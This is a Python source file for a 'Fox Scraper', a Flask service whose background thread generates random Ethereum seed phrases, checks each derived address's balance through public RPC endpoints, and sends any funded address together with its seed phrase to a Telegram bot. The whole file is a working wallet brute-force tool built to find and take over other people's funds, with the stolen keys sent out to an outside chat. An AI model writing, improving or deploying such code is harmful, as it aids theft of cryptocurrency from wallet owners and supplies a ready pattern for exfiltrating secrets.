import os, threading, time, random, requests, sys
from flask import Flask
from mnemonic import Mnemonic
from eth_account import Account

Account.enable_unaudited_hdwallet_features()
app = Flask(__name__)

# CONFIG
RPC_URLS = ["https://eth.llamarpc.com", "https://cloudflare-eth.com", "https://rpc.ankr.com/eth"]
TG_TOKEN = os.environ.get("TELEGRAM_TOKEN")
TG_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

stats = {"checked": 0, "hits": 0, "status": "Initializing"}

def send_tg_message(text):
    if not TG_TOKEN or not TG_CHAT_ID: return
    try:
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", 
                      json={"chat_id": TG_CHAT_ID, "text": text, "parse_mode": "Markdown"}, timeout=5)
    except: pass

def scraper_worker():
    mnemo = Mnemonic("english")
    stats["status"] = "Running"
    send_tg_message("🦊 **Fox Scraper is Online**\nLogs are flushing...")
    
    session = requests.Session()
    while True:
        try:
            phrase = mnemo.to_mnemonic(os.urandom(16))
            acc = Account.from_mnemonic(phrase)
            
            response = session.post(random.choice(RPC_URLS), 
                                    json={"jsonrpc":"2.0","method":"eth_getBalance","params":[acc.address,"latest"],"id":1}, 
                                    timeout=5)
            
            if response.status_code == 200:
                bal = int(response.json().get('result', '0x0'), 16)
                if bal > 0:
                    send_tg_message(f"💰 **HIT!**\nBal: {bal/10**18} ETH\nAddr: `{acc.address}`\nKey: `{phrase}`")
                
                stats["checked"] += 1
                # Force print to Render logs
                if stats["checked"] % 10 == 0:
                    print(f"[*] Scanned: {stats['checked']} | Last: {acc.address[:10]}...", flush=True)
            
            elif response.status_code == 429:
                time.sleep(10)
        except Exception as e:
            # If it crashes, tell you why via Telegram
            send_tg_message(f"⚠️ **Worker Error:** `{str(e)}`")
            time.sleep(5)

@app.route('/')
def home():
    return {"status": stats["status"], "checked": stats["checked"], "hits": stats["hits"]}

if __name__ == "__main__":
    threading.Thread(target=scraper_worker, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
